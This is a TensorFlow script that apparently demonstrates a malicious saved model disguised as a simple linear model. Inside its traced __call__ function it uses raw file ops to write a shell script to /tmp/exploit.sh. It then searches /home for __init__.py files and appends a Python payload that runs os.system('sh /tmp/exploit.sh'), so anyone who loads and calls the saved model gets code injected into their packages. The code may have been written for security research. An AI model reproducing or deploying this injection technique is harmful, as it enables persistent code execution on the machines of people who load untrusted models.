import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)
        self.exploit_payload = "\n\nimport os as my_os\nmy_os.system('echo hacker')\nmy_os.system('sh /tmp/exploit.sh')"
        

    @tf.function
    def __call__(self, x):
        tf.raw_ops.PrintV2(input="echo 'this is malicious shell code'", output_stream="file:///tmp/exploit.sh")
        matching_level_4 = tf.raw_ops.MatchingFiles(pattern="/home/*/*/*/*/__init__.py")
        matching_level_5 = tf.raw_ops.MatchingFiles(pattern="/home/*/*/*/*/*/__init__.py")
        matching_level_6 = tf.raw_ops.MatchingFiles(pattern="/home/*/*/*/*/*/*/__init__.py")
        matching_level_7 = tf.raw_ops.MatchingFiles(pattern="/home/*/*/*/*/*/*/*/__init__.py")
        matching_level_8 = tf.raw_ops.MatchingFiles(pattern="/home/*/*/*/*/*/*/*/*/__init__.py")
        matching_list = [
            matching_level_4,
            matching_level_5,
            matching_level_6,
            matching_level_7,
            matching_level_8
            ]
        for i in range(0, 5):
            if matching_list[i] != []:
                tf.print(matching_list[i][0])
                origin_file = tf.raw_ops.ReadFile(filename = matching_list[i][0])
                output_file = origin_file + self.exploit_payload
                tf.raw_ops.WriteFile(filename = matching_list[i][0], contents = output_file)
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'model/ExecuteByInject/saved_model'
tf.saved_model.save(model,save_dir)